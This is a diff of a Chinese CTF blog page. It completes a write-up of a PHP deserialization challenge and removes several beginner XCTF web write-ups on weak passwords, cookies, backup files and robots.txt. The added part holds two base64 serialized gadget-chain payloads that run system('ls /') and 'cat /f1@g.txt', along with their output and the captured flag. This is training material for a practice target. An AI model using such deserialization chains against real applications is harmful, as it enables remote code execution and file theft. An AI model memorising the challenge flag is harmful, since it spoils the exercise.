+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzoyMjoiQ29udHJvbFxTdGF0ZVxTdG9wSG9vayI6MTp7czoxMjoiACoAcHJvY2Vzc2VzIjthOjE6e2k6MDtPOjE3OiJGYWtlclxNeUdlbmVyYXRvciI6MTp7czoxNToiACoAZGVmYXVsdFZhbHVlIjtPOjE5OiJNZXRob2RcRnVuY1xHZXRGaWxlIjoyOntzOjI1OiIATWV0aG9kXEZ1bmNcR2V0RmlsZQBmbGFnIjtPOjIyOiJNZXRob2RcRnVuY1xHZXREZWZhdWx0IjoxOntzOjMwOiIATWV0aG9kXEZ1bmNcR2V0RGVmYXVsdABzb3VyY2UiO086MjQ6Ik1ldGhvZFxGdW5jXEdlbmVyYXRlRmlsZSI6Mzp7czo0OiJmbGFnIjtzOjY6Im15VGVzdCI7czo5OiIAKgBidWZmZXIiO047czo2OiJzb3VyY2UiO086ODoic3RkQ2xhc3MiOjE6e3M6ODoiZ2VuZXJhdGUiO0M6MzI6Ik9waXNcQ2xvc3VyZVxTZXJpYWxpemFibGVDbG9zdXJlIjoxODg6e2E6NTp7czozOiJ1c2UiO2E6MDp7fXM6ODoiZnVuY3Rpb24iO3M6MzU6ImZ1bmN0aW9uKCl7IGV2YWwoc3lzdGVtKCdscyAvJykpOyB9IjtzOjU6InNjb3BlIjtzOjI0OiJNZXRob2RcRnVuY1xHZW5lcmF0ZUZpbGUiO3M6NDoidGhpcyI7TjtzOjQ6InNlbGYiO3M6MzI6IjAwMDAwMDAwMmIzZjg4ZGMwMDAwMDAwMDE5NjUyZjhjIjt9fX19fXM6NToidmFsdWUiO3M6NDoidGVzdCI7fX19fQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>将作为post参数data传递，获得回显：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin dev etc f1@g.txt home lib media mnt opt proc root run sbin srv sys tmp usr var</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>修改<code>$function = function()&#123; eval(system(&#39;cat /fl@g.txt&#39;)); &#125;;</code>，重新序列化：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzoyMjoiQ29udHJvbFxTdGF0ZVxTdG9wSG9vayI6MTp7czoxMjoiACoAcHJvY2Vzc2VzIjthOjE6e2k6MDtPOjE3OiJGYWtlclxNeUdlbmVyYXRvciI6MTp7czoxNToiACoAZGVmYXVsdFZhbHVlIjtPOjE5OiJNZXRob2RcRnVuY1xHZXRGaWxlIjoyOntzOjI1OiIATWV0aG9kXEZ1bmNcR2V0RmlsZQBmbGFnIjtPOjIyOiJNZXRob2RcRnVuY1xHZXREZWZhdWx0IjoxOntzOjMwOiIATWV0aG9kXEZ1bmNcR2V0RGVmYXVsdABzb3VyY2UiO086MjQ6Ik1ldGhvZFxGdW5jXEdlbmVyYXRlRmlsZSI6Mzp7czo0OiJmbGFnIjtzOjY6Im15VGVzdCI7czo5OiIAKgBidWZmZXIiO047czo2OiJzb3VyY2UiO086ODoic3RkQ2xhc3MiOjE6e3M6ODoiZ2VuZXJhdGUiO0M6MzI6Ik9waXNcQ2xvc3VyZVxTZXJpYWxpemFibGVDbG9zdXJlIjoxOTc6e2E6NTp7czozOiJ1c2UiO2E6MDp7fXM6ODoiZnVuY3Rpb24iO3M6NDQ6ImZ1bmN0aW9uKCl7IGV2YWwoc3lzdGVtKCdjYXQgL2YxQGcudHh0JykpOyB9IjtzOjU6InNjb3BlIjtzOjI0OiJNZXRob2RcRnVuY1xHZW5lcmF0ZUZpbGUiO3M6NDoidGhpcyI7TjtzOjQ6InNlbGYiO3M6MzI6IjAwMDAwMDAwNzBkY2RiODIwMDAwMDAwMGFiNmZiZTVmIjt9fX19fXM6NToidmFsdWUiO3M6NDoidGVzdCI7fX19fQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure></li>
+<li><p>获得flag：</p>
+</li>
+</ul>
+<p><img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202110020318190.png" alt="image-20211002021317038"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;16ed60c5-d06f-4974-931b-a26b07b5618d&#125;</span><br></pre></td></tr></table></figure>
       
 
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
       
     </div>
     <div class="article-info article-info-index">
@@ -210,16 +311,75 @@
       
 
       
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/03/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAsimple-php/">展开全文 >></a>
-        </p>
-      
 
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/10/05/xxc/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+  
+    <a href="/2021/09/29/uploadlabs/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">uploadlabs</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -238,6 +398,16 @@
 </aside>
 
 
+
+  
+  
+  
+
+  
+
+  
+
+  
 
 
     <section id="comments" style="margin:10px;padding:10px;background:#fff;">
@@ -262,867 +432,6 @@
 
     </section>
   
-  
-    <article id="post-攻防世界web新手区weak-auth" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/03/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAweak-auth/">攻防世界web新手区weak_auth</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/03/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAweak-auth/" class="archive-article-date">
-  	<time datetime="2021-03-14T11:19:41.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-14</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>第六题，弱密码</p>
-<img src="/2021/03/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAweak-auth/weak_auth1.PNG" class="" title="weak_auth1.PNG">
-<img src="/2021/03/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAweak-auth/weak_auth2.PNG" class="" title="weak_auth2.PNG">
-<p>直接burpsuite抓包，发现密码并没有加密</p>
-<img src="/2021/03/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAweak-auth/weak_auth3.PNG" class="" title="weak_auth3.PNG">
-<p>直接发到intruder，导入弱密码</p>
-<img src="/2021/03/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAweak-auth/weak_auth4.PNG" class="" title="weak_auth4.PNG">
-<p>因为这道题所有回显都是200（ok），所以可以用回显的长度来区分是否有flag，分别选择正序和逆序即可，找到不同的回显</p>
-<img src="/2021/03/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAweak-auth/weak_auth5.PNG" class="" title="weak_auth5.PNG">
-<p>得到flag</p>
-<img src="/2021/03/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAweak-auth/weak_auth6.PNG" class="" title="weak_auth6.PNG">
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/03/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAweak-auth/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-攻防世界web新手区disabled-button" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAdisabled-button/">攻防世界web新手区disabled_button</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAdisabled-button/" class="archive-article-date">
-  	<time datetime="2021-03-13T14:22:02.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-13</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>第五题，题目提示按键不能用</p>
-<img src="/2021/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAdisabled-button/disabled_button1.PNG" class="" title="disabled_button1.PNG">
-<img src="/2021/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAdisabled-button/disabled_button2.PNG" class="" title="disabled_button2.PNG">
-<p>F12打开元素，找到按钮的那一个（或者直接对着按钮右键——检查），发现一个 disabled</p>
-<img src="/2021/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAdisabled-button/disabled_button3.PNG" class="" title="disabled_button3.PNG">
-<p>删除disabled，按钮就可以按了</p>
-<img src="/2021/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAdisabled-button/disabled_button4.PNG" class="" title="disabled_button4.PNG">
-<img src="/2021/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAdisabled-button/disabled_button5.PNG" class="" title="disabled_button5.PNG">
-<p>得到flag</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAdisabled-button/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-攻防世界web新手区cookie" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAcookie/">攻防世界web新手区cookie</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAcookie/" class="archive-article-date">
-  	<time datetime="2021-03-13T14:10:02.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-13</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>第四题，考cookie，http中很熟悉的东西</p>
-<img src="/2021/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAcookie/cookie1.PNG" class="" title="cookie1.PNG">
-<img src="/2021/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAcookie/cookie2.PNG" class="" title="cookie2.PNG">
-
-<p>burpsuit抓包，发现cookie下有一个cookie.php</p>
-<img src="/2021/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAcookie/cookie3.PNG" class="" title="cookie3.PNG">
-
-<p>加在url上，显示要看回显，继续burpsuite</p>
-<img src="/2021/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAcookie/cookie4.PNG" class="" title="cookie4.PNG">
-<img src="/2021/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAcookie/cookie5.PNG" class="" title="cookie5.PNG">
-
-<p>得到flag</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAcookie/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-攻防世界web新手区backup" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAbackup/">攻防世界web新手区backup</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAbackup/" class="archive-article-date">
-  	<time datetime="2021-03-13T13:47:15.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-13</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>第三题</p>
-<img src="/2021/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAbackup/backup1.PNG" class="" title="backup1.PNG">
-<img src="/2021/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAbackup/backup2.PNG" class="" title="backup2.PNG">
-<p>由题目说是“备份文件”</p>
-<p>方法一：<br>百度得到：如果网站存在备份文件，常见的备份文件后缀名有：“.git” 、“.svn”、“ .swp”“.~”、“.bak”、“.bash_history”、“.bkf” 所以可以尝试在URL后面，依次输入常见的文件备份扩展名。</p>
-<p>输入index.php.bak时，得到一个文件，用记事本打开，得到flag</p>
-<img src="/2021/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAbackup/backup3.PNG" class="" title="backup3.PNG">
-<img src="/2021/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAbackup/backup4.PNG" class="" title="backup4.PNG">
-<img src="/2021/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAbackup/backup5.PNG" class="" title="backup5.PNG">
-
-<p>方法二：<br>burpsuite扫描，直接出来</p>
-<img src="/2021/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAbackup/backup6.PNG" class="" title="backup6.PNG">
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAbackup/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-攻防世界web新手区robots" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BArobots/">攻防世界web新手区robots</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BArobots/" class="archive-article-date">
-  	<time datetime="2021-03-13T13:25:42.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-13</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>第二题</p>
-<img src="/2021/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BArobots/robots1.PNG" class="" title="robots1.PNG">
-<p>首先，题目提示是robots协议<br>百度了一下：</p>
-<p>robots协议也叫robots.txt（统一小写）是一种存放于网站根目录下的ASCII编码的文本文件，它通常告诉网络搜索引擎的漫游器（又称网络蜘蛛），此网站中的哪些内容是不应被搜索引擎的漫游器获取的，哪些是可以被漫游器获取的。因为一些系统中的URL是大小写敏感的，所以robots.txt的文件名应统一为小写。robots.txt应放置于网站的根目录下。如果想单独定义搜索引擎的漫游器访问子目录时的行为，那么可以将自定的设置合并到根目录下的robots.txt，或者使用robots元数据（Metadata，又称元数据）。</p>
-<p>得到可能有robots.txt文件，并在根目录下<br>试一试：</p>
-<img src="/2021/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BArobots/robots2.PNG" class="" title="robots2.PNG">
-
-<p>获得了这个文件，显示有一个f1ag_1s_h3re.php的文件<br>在根目录下试一试：</p>
-<img src="/2021/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BArobots/robots3.PNG" class="" title="robots3.PNG">
-<p>获得flag</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BArobots/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-攻防世界web新手区view-source" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAview-source/">攻防世界web新手区view-source</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAview-source/" class="archive-article-date">
-  	<time datetime="2021-03-12T00:27:30.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-12</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>第一题，右键没用，打不开控制台</p>
-<img src="/2021/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAview-source/view_source1.PNG" class="" title="view_source1">
-<p>没什么技术含量，F12</p>
-<img src="/2021/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAview-source/view_source3.PNG" class="" title="view_source3">
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/03/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAview-source/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-catalog" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/03/12/catalog/">catalog</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/03/12/catalog/" class="archive-article-date">
-  	<time datetime="2021-03-12T00:26:38.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-12</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
